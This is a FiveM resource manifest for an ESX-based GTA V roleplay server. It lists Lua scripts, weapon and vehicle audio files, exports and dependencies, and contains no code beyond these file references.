fx_version "bodacious"
games {"gta5"}
lua54 'yes'
client_scripts {
  '@es_extended/locale.lua',
  'client/*.lua',
  'global/*.lua',
  'lib/*.lua',
  'lib/Blips/main.lua',
  'lib/Components/main.lua',
  'lib/Peds/main.lua',
  'scripts/**/client.lua',
}

server_scripts {
  '@es_extended/locale.lua',
	'@mysql-async/lib/MySQL.lua',
  'server/*.lua',
  'server/Logs/fuckmedaddy.lua',
  'server/lib/main.lua'
}

files {
  'data/mapzoomdata.meta',
  'data/pausemenu.xml',
  'audio/sfx/resident/explosions.awc',
  'audio/sfx/resident/vehicles.awc',
  'audio/sfx/resident/weapons.awc',
  'audio/sfx/weapons_player/lmg_combat.awc',
  'audio/sfx/weapons_player/lmg_mg_player.awc',
  'audio/sfx/weapons_player/mgn_sml_am83_vera.awc',
  'audio/sfx/weapons_player/mgn_sml_am83_verb.awc',
  'audio/sfx/weapons_player/mgn_sml_sc__l.awc',
  'audio/sfx/weapons_player/ptl_50cal.awc',
  'audio/sfx/weapons_player/ptl_combat.awc',
  'audio/sfx/weapons_player/ptl_pistol.awc',
  'audio/sfx/weapons_player/ptl_px4.awc',
  'audio/sfx/weapons_player/ptl_rubber.awc',
  'audio/sfx/weapons_player/sht_bullpup.awc',
  'audio/sfx/weapons_player/sht_pump.awc',
  'audio/sfx/weapons_player/smg_micro.awc',
  'audio/sfx/weapons_player/smg_smg.awc',
  'audio/sfx/weapons_player/snp_heavy.awc',
  'audio/sfx/weapons_player/snp_rifle.awc',
  'audio/sfx/weapons_player/spl_grenade_player.awc',
  'audio/sfx/weapons_player/spl_minigun_player.awc',
  'audio/sfx/weapons_player/spl_prog_ar_player.awc',
  'audio/sfx/weapons_player/spl_railgun.awc',
  'audio/sfx/weapons_player/spl_rpg_player.awc',
  'audio/sfx/weapons_player/spl_tank_player.awc'
}
exports {
  'DisplayingStreet',
  'DisplayingTime',
  'isHandcuffed',
  'getMenuIsOpen',
  'me',
  'odo',
  'try',
  'dw',
  'serwer',
  'news',
  'wezzle',
  'twt',
  'w',
  'wejdzbagol',
  'AddonLoadMe',
  'reloadmewhynot',
  'FreezeVehicle',
  'UnFreezeVehicle',
  'FreezePed',
  'UnFreezePed',
  'ClearTask',
  'checkInTrunk',
}

dependencies {
  'es_extended'
}

client_script '@pozdoodtajczyka/client/main.lua'